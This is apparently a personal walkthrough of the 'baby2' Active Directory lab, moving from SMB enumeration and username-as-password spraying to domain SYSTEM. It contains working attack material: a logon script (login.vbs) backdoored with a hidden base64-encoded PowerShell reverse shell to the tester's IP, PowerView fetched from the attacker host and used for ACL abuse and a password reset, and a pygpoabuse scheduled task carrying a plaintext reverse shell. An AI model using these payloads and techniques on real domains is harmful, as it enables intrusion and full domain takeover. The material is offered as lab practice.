

## Lab Details
- Difficulty: Medium
- OS: Windows 

## Summary
- Initial access: AD Misconfiguration, AD User Excessive Permissions
- Privilege escalation: GPO Abuse 

## Enumeration
#### Steps
- run `nmap`
```
$ nmap 10.129.234.72 -p- -sC -sV -A -v -Pn
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-09 10:55:18Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
| Issuer: commonName=baby2-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-08-19T14:22:11
| Not valid after:  2105-08-19T14:22:11
| MD5:   4ef7:774c:a979:8d43:b332:cc53:7cb6:41ab
|_SHA-1: 6cfd:3491:aa6c:4131:52e2:f61e:361f:b332:5eec:47ff
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
| Issuer: commonName=baby2-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-08-19T14:22:11
| Not valid after:  2105-08-19T14:22:11
| MD5:   4ef7:774c:a979:8d43:b332:cc53:7cb6:41ab
|_SHA-1: 6cfd:3491:aa6c:4131:52e2:f61e:361f:b332:5eec:47ff
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
| Issuer: commonName=baby2-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-08-19T14:22:11
| Not valid after:  2105-08-19T14:22:11
| MD5:   4ef7:774c:a979:8d43:b332:cc53:7cb6:41ab
|_SHA-1: 6cfd:3491:aa6c:4131:52e2:f61e:361f:b332:5eec:47ff
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
| Issuer: commonName=baby2-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-08-19T14:22:11
| Not valid after:  2105-08-19T14:22:11
| MD5:   4ef7:774c:a979:8d43:b332:cc53:7cb6:41ab
|_SHA-1: 6cfd:3491:aa6c:4131:52e2:f61e:361f:b332:5eec:47ff
|_ssl-date: TLS randomness does not represent time
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-07-09T10:56:46+00:00; -7s from scanner time.
| ssl-cert: Subject: commonName=dc.baby2.vl
| Issuer: commonName=dc.baby2.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-07-08T10:30:04
| Not valid after:  2027-01-07T10:30:04
| MD5:   54d8:8ed1:dbba:b34e:e2d1:c90c:5f25:76a2
|_SHA-1: e2db:d6cf:5941:a8a0:23d6:6c9f:1d83:dedb:e0fa:fc11
| rdp-ntlm-info: 
|   Target_Name: BABY2
|   NetBIOS_Domain_Name: BABY2
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: baby2.vl
|   DNS_Computer_Name: dc.baby2.vl
|   DNS_Tree_Name: baby2.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-07-09T10:56:06+00:00
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
54023/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
54024/tcp open  msrpc         Microsoft Windows RPC
54036/tcp open  msrpc         Microsoft Windows RPC
57082/tcp open  msrpc         Microsoft Windows RPC
57112/tcp open  msrpc         Microsoft Windows RPC
63798/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: -7s, deviation: 0s, median: -7s
| smb2-time: 
|   date: 2026-07-09T10:56:11
|_  start_date: N/A

```
- Anonymous user enumeration 
```
$nxc smb 10.129.2.239 -u 'guest' -p ''
SMB         10.129.2.239    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.2.239    445    DC               [+] baby2.vl\guest:
$nxc smb 10.129.2.239 -u '' -p ''
SMB         10.129.2.239    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.2.239    445    DC               [+] baby2.vl\:
```
- Enumerate SMB shares anonymously 
```
$smbmap -H 10.129.2.239 -u 'a' -p ''

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 0 authenticated session(s)

[+] IP: 10.129.2.239:445        Name: 10.129.2.239              Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        apps                                                    READ ONLY
        C$                                                      NO ACCESS       Default share
        docs                                                    NO ACCESS
        homes                                                   READ, WRITE
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share
        SYSVOL                                                  NO ACCESS       Logon server share
[*] Closed 1 connections
```
- Enumerate `apps` share
```
$smbclient  //10.129.2.239/'apps'
Password for [WORKGROUP\ch4os1]:
Try "help" to get a list of possible commands.
smb: \> recurse ON
smb: \> ls
  .                                   D        0  Thu Sep  7 15:12:59 2023
  ..                                  D        0  Tue Aug 22 16:10:21 2023
  dev                                 D        0  Thu Sep  7 15:13:50 2023

\dev
  .                                   D        0  Thu Sep  7 15:13:50 2023
  ..                                  D        0  Thu Sep  7 15:12:59 2023
  CHANGELOG                           A      108  Thu Sep  7 15:16:15 2023
  login.vbs.lnk                       A     1800  Thu Sep  7 15:13:23 2023

                6126847 blocks of size 4096. 1258418 blocks available
smb: \> cd dev
smb: \dev\> mget CHANGELOG
```
- Download `CHANGELOG` and display the out, it states that theres a logon script 
```
$cat CHANGELOG
[0.2]

- Added automated drive mapping

[0.1]

- Rolled out initial version of the domain logon script⏎
```
- Enumerate `homes` share
```
$smbclient  //10.129.2.239/homes
Password for [WORKGROUP\ch4os1]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Aug 25 04:08:33 2025
  ..                                  D        0  Tue Aug 22 16:10:21 2023
  Amelia.Griffiths                    D        0  Tue Aug 22 16:17:06 2023
  Carl.Moore                          D        0  Tue Aug 22 16:17:06 2023
  Harry.Shaw                          D        0  Tue Aug 22 16:17:06 2023
  Joan.Jennings                       D        0  Tue Aug 22 16:17:06 2023
  Joel.Hurst                          D        0  Tue Aug 22 16:17:06 2023
  Kieran.Mitchell                     D        0  Tue Aug 22 16:17:06 2023
  library                             D        0  Tue Aug 22 16:22:47 2023
  Lynda.Bailey                        D        0  Tue Aug 22 16:17:06 2023
  Mohammed.Harris                     D        0  Tue Aug 22 16:17:06 2023
  Nicola.Lamb                         D        0  Tue Aug 22 16:17:06 2023
  Ryan.Jenkins                        D        0  Tue Aug 22 16:17:06 2023

                6126847 blocks of size 4096. 1051134 blocks available
```
- Enumerate `NETLOGON` 
```
$smbclient  //10.129.2.239/'NETLOGON'
Password for [WORKGROUP\ch4os1]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Aug 25 04:30:39 2025
  ..                                  D        0  Tue Aug 22 13:43:55 2023
  login.vbs                           A      992  Sat Sep  2 10:55:51 2023

                6126847 blocks of size 4096. 1260193 blocks available
```
- The script  **automatically map network drives** when a domain user login to a domain joined machine 
```
$cat login.vbs
Sub MapNetworkShare(sharePath, driveLetter)
    Dim objNetwork
    Set objNetwork = CreateObject("WScript.Network")

    ' Check if the drive is already mapped
    Dim mappedDrives
    Set mappedDrives = objNetwork.EnumNetworkDrives
    Dim isMapped
    isMapped = False
    For i = 0 To mappedDrives.Count - 1 Step 2
        If UCase(mappedDrives.Item(i)) = UCase(driveLetter & ":") Then
            isMapped = True
            Exit For
        End If
    Next

    If isMapped Then
        objNetwork.RemoveNetworkDrive driveLetter & ":", True, True
    End If

    objNetwork.MapNetworkDrive driveLetter & ":", sharePath

    If Err.Number = 0 Then
        WScript.Echo "Mapped " & driveLetter & ": to " & sharePath
    Else
        WScript.Echo "Failed to map " & driveLetter & ": " & Err.Description
    End If

    Set objNetwork = Nothing
End Sub

MapNetworkShare "\\dc.baby2.vl\apps", "V"
MapNetworkShare "\\dc.baby2.vl\docs", "L"
```
- Attempt `rid-brute` with guest login
```
nxc smb 10.129.2.239 -u 'guest' -p '' --rid-brute
SMB         10.129.2.239    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.2.239    445    DC               [+] baby2.vl\guest:
SMB         10.129.2.239    445    DC               498: BABY2\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.2.239    445    DC               500: BABY2\Administrator (SidTypeUser)
SMB         10.129.2.239    445    DC               501: BABY2\Guest (SidTypeUser)
SMB         10.129.2.239    445    DC               502: BABY2\krbtgt (SidTypeUser)
SMB         10.129.2.239    445    DC               512: BABY2\Domain Admins (SidTypeGroup)
SMB         10.129.2.239    445    DC               513: BABY2\Domain Users (SidTypeGroup)
SMB         10.129.2.239    445    DC               514: BABY2\Domain Guests (SidTypeGroup)
SMB         10.129.2.239    445    DC               515: BABY2\Domain Computers (SidTypeGroup)
SMB         10.129.2.239    445    DC               516: BABY2\Domain Controllers (SidTypeGroup)
SMB         10.129.2.239    445    DC               517: BABY2\Cert Publishers (SidTypeAlias)
SMB         10.129.2.239    445    DC               518: BABY2\Schema Admins (SidTypeGroup)
SMB         10.129.2.239    445    DC               519: BABY2\Enterprise Admins (SidTypeGroup)
SMB         10.129.2.239    445    DC               520: BABY2\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.2.239    445    DC               521: BABY2\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.2.239    445    DC               522: BABY2\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.2.239    445    DC               525: BABY2\Protected Users (SidTypeGroup)
SMB         10.129.2.239    445    DC               526: BABY2\Key Admins (SidTypeGroup)
SMB         10.129.2.239    445    DC               527: BABY2\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.2.239    445    DC               553: BABY2\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.2.239    445    DC               571: BABY2\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.2.239    445    DC               572: BABY2\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.2.239    445    DC               1000: BABY2\DC$ (SidTypeUser)
SMB         10.129.2.239    445    DC               1101: BABY2\DnsAdmins (SidTypeAlias)
SMB         10.129.2.239    445    DC               1102: BABY2\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.2.239    445    DC               1103: BABY2\gpoadm (SidTypeUser)
SMB         10.129.2.239    445    DC               1104: BABY2\office (SidTypeGroup)
SMB         10.129.2.239    445    DC               1105: BABY2\Joan.Jennings (SidTypeUser)
SMB         10.129.2.239    445    DC               1106: BABY2\Mohammed.Harris (SidTypeUser)
SMB         10.129.2.239    445    DC               1107: BABY2\Harry.Shaw (SidTypeUser)
SMB         10.129.2.239    445    DC               1108: BABY2\Carl.Moore (SidTypeUser)
SMB         10.129.2.239    445    DC               1109: BABY2\Ryan.Jenkins (SidTypeUser)
SMB         10.129.2.239    445    DC               1110: BABY2\Kieran.Mitchell (SidTypeUser)
SMB         10.129.2.239    445    DC               1111: BABY2\Nicola.Lamb (SidTypeUser)
SMB         10.129.2.239    445    DC               1112: BABY2\Lynda.Bailey (SidTypeUser)
SMB         10.129.2.239    445    DC               1113: BABY2\Joel.Hurst (SidTypeUser)
SMB         10.129.2.239    445    DC               1114: BABY2\Amelia.Griffiths (SidTypeUser)
SMB         10.129.2.239    445    DC               1602: BABY2\library (SidTypeUser)
SMB         10.129.2.239    445    DC               2601: BABY2\legacy (SidTypeGroup)
```
- Extract the usernames 
```
Administrator
Guest
krbtgt
DC$
gpoadm
Joan.Jennings
Mohammed.Harris
Harry.Shaw
Carl.Moore
Ryan.Jenkins
Kieran.Mitchell
Nicola.Lamb
Lynda.Bailey
Joel.Hurst
Amelia.Griffiths
library
```
## Foothold

#### Steps
- Save the usernames into a file and spray the usernames as password, identified user `Carl.Moore` and `library` is using username as password
```
$nxc smb 10.129.2.239 -u users -p users
SMB         10.129.2.239    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:None) (Null Auth:True)
<SNIP>
SMB         10.129.2.239    445    DC               [+] baby2.vl\Carl.Moore:Carl.Moore
SMB         10.129.2.239    445    DC               [+] baby2.vl\library:library
<SNIP>
```
- Enumerate shares as `Carl.Moore`
```
$nxc smb 10.129.2.239 -u Carl.Moore -p Carl.Moore --shares
SMB         10.129.2.239    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.2.239    445    DC               [+] baby2.vl\Carl.Moore:Carl.Moore
SMB         10.129.2.239    445    DC               [*] Enumerated shares
SMB         10.129.2.239    445    DC               Share           Permissions     Remark
SMB         10.129.2.239    445    DC               -----           -----------     ------
SMB         10.129.2.239    445    DC               ADMIN$                          Remote Admin
SMB         10.129.2.239    445    DC               apps            READ,WRITE
SMB         10.129.2.239    445    DC               C$                              Default share
SMB         10.129.2.239    445    DC               docs            READ,WRITE
SMB         10.129.2.239    445    DC               homes           READ,WRITE
SMB         10.129.2.239    445    DC               IPC$            READ            Remote IPC
SMB         10.129.2.239    445    DC               NETLOGON        READ            Logon server share
SMB         10.129.2.239    445    DC               SYSVOL          READ            Logon server share
```
- Enumerate shares as `library`
```
$nxc smb 10.129.234.72 -u library -p library --shares
SMB         10.129.234.72   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.72   445    DC               [+] baby2.vl\library:library
SMB         10.129.234.72   445    DC               [*] Enumerated shares
SMB         10.129.234.72   445    DC               Share           Permissions     Remark
SMB         10.129.234.72   445    DC               -----           -----------     ------
SMB         10.129.234.72   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.72   445    DC               apps            READ,WRITE
SMB         10.129.234.72   445    DC               C$                              Default share
SMB         10.129.234.72   445    DC               docs            READ,WRITE
SMB         10.129.234.72   445    DC               homes           READ,WRITE
SMB         10.129.234.72   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.72   445    DC               NETLOGON        READ            Logon server share
SMB         10.129.234.72   445    DC               SYSVOL          READ            Logon server share
```
- Enumerate further we find `Carl.Moore` has write access to the SYSVOL share
```
$smbclient  //10.129.234.72/SYSVOL -U Carl.Moore
Password for [WORKGROUP\Carl.Moore]:
Try "help" to get a list of possible commands.
smb: \> recurse ON
smb: \> ls
  .                                   D        0  Tue Aug 22 13:37:36 2023
  ..                                  D        0  Tue Aug 22 13:37:36 2023
  baby2.vl                           Dr        0  Tue Aug 22 13:37:36 2023

\baby2.vl
  .                                   D        0  Tue Aug 22 13:43:55 2023
  ..                                  D        0  Tue Aug 22 13:37:36 2023
  DfsrPrivate                      DHSr        0  Tue Aug 22 13:43:55 2023
  Policies                            D        0  Tue Aug 22 13:37:41 2023
  scripts                             D        0  Mon Aug 25 04:30:39 2025

\baby2.vl\DfsrPrivate
NT_STATUS_ACCESS_DENIED listing \baby2.vl\DfsrPrivate\*

\baby2.vl\Policies
  .                                   D        0  Tue Aug 22 13:37:41 2023
  ..                                  D        0  Tue Aug 22 13:43:55 2023
  {31B2F340-016D-11D2-945F-00C04FB984F9}      D        0  Tue Aug 22 13:37:41 2023
  {6AC1786C-016F-11D2-945F-00C04fB984F9}      D        0  Tue Aug 22 13:37:41 2023

\baby2.vl\scripts
  .                                   D        0  Mon Aug 25 04:30:39 2025
  ..                                  D        0  Tue Aug 22 13:43:55 2023
  login.vbs                           A      992  Sat Sep  2 10:55:51 2023
  <SNIP>
```
- We can attempt to inject a reverse shell into the login.vbs script and wait for a login attempt
- Modified script below:
```
$cat login.vbs
Sub MapNetworkShare(sharePath, driveLetter)
    Dim objNetwork
    Set objNetwork = CreateObject("WScript.Network")

    ' Check if the drive is already mapped
    Dim mappedDrives
    Set mappedDrives = objNetwork.EnumNetworkDrives
    Dim isMapped
    isMapped = False
    For i = 0 To mappedDrives.Count - 1 Step 2
        If UCase(mappedDrives.Item(i)) = UCase(driveLetter & ":") Then
            isMapped = True
            Exit For
        End If
    Next

    If isMapped Then
        objNetwork.RemoveNetworkDrive driveLetter & ":", True, True
    End If

    objNetwork.MapNetworkDrive driveLetter & ":", sharePath

    If Err.Number = 0 Then
        WScript.Echo "Mapped " & driveLetter & ": to " & sharePath
    Else
        WScript.Echo "Failed to map " & driveLetter & ": " & Err.Description
    End If

    Set objNetwork = Nothing
End Sub

' --- Map the network drives ---
MapNetworkShare "\\dc.baby2.vl\apps", "V"
MapNetworkShare "\\dc.baby2.vl\docs", "L"

' ========== ADDED REVERSE SHELL ==========
Dim objShell
Set objShell = CreateObject("WScript.Shell")

' The "0" at the end hides the PowerShell window (stealth mode)
objShell.Run "powershell.exe -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANQA0ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==", 0

Set objShell = Nothing
```
- Replace the `login.vbs` with our version and start a listener
```
<SNIP>
smb: \baby2.vl\scripts\> del login.vbs
smb: \baby2.vl\scripts\> mput login.vbs
Put file login.vbs? yes
putting file login.vbs as \baby2.vl\scripts\login.vbs (3.0 kb/s) (average 3.0 kb/s)
smb: \baby2.vl\scripts\> ls
  .                                   D        0  Fri Jul 10 04:48:52 2026
  ..                                  D        0  Tue Aug 22 13:43:55 2023
  login.vbs                           A     2580  Fri Jul 10 04:48:52 2026

                6126847 blocks of size 4096. 1397920 blocks available
```
- We get a shell as `amelia.griffiths` after sometime 
```
$nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.234.72 49581

PS C:\Windows\system32> whoami
baby2\amelia.griffiths
```
## Lateral Movement 

#### Steps

## Privilege Escalation

#### Steps
- Enumerate the target domain using bloodhound 
```
$bloodhound-ce-python -u Carl.Moore -p Carl.Moore -d baby2.vl --zip -c All -dc dc.baby2.vl -ns 10.129.2.239
```
- We see that `amelia.griffiths` is member of `legacy` group which has `WriteOwner` access over GPOADM
![[Pasted image 20260710165102.png]]
- GPOADM user has `GenericAll` permission over the `DOMAIN POLICY` GPO
![[Pasted image 20260710170326.png]]
- We can attempt to exploit the path to elevate our permission
- First on the target shell, fetch `PowerView` then grant all permission to GPOADM as Amelida.Griffiths and change password of of GPOADM
```
PS C:\temp> wget http://10.10.16.54:8000/PowerView.ps1 -o ./PowerView.ps1
PS C:\temp> . ./PowerView.ps1
PS C:\temp> add-domainobjectacl -rights "all" -targetidentity "gpoadm" -principalidentity "Amelia.Griffiths"

PS C:\temp> PS C:\temp> $cred = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
PS C:\temp> set-domainuserpassword gpoadm -accountpassword $cred
```
- Confirm the password has been updated
```
$nxc smb 10.129.234.72 -u gpoadm -p 'Password123!'
SMB         10.129.234.72   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.72   445    DC               [+] baby2.vl\gpoadm:Password123!
```
- Next we will attempt to write a reverse shell to the `DEFAULT DOMAIN POLICY` GPO
![[Pasted image 20260710172116.png]]
- First create a scheduled task
```
$python3 pygpoabuse.py 'baby2.vl'/'gpoadm':'Password123!' -gpo-id "31B2F340-016D-11D2-945F-00C04FB984F9"
[+] ScheduledTask TASK_b4f9e108 created!
```
- Second write a reverse shell into the GPO
```
python3 pygpoabuse.py 'baby2.vl'/'gpoadm':'Password123!' -gpo-id "31B2F340-016D-11D2-945F-00C04FB984F9" \
                              -powershell \
                              -command "\$client = New-Object System.Net.Sockets.TCPClient('10.10.16.54',4445);\$stream = \$client
.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object
-TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendba
ck + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.
Length);\$stream.Flush()};\$client.Close()" \
                              -taskname "Completely Legit Task" \
                              -description "Dis is legit, pliz no delete" -f
[+] ScheduledTask Completely Legit Task created!
```
- Last run `gpupdate` in the reverse shell of user `amelia.griffiths`
```
PS C:\temp> gpupdate
Updating policy...



Computer Policy update has completed successfully.

User Policy update has completed successfully.
```
- A shell received after the `gpupdate`
```
$nc -lvnp 4445
Listening on 0.0.0.0 4445
Connection received on 10.129.234.72 50038

PS C:\Windows\system32> whoami
nt authority\system
```
## Lessons Learned
- Attack family:
- Key takeaway:

## Resources
- References: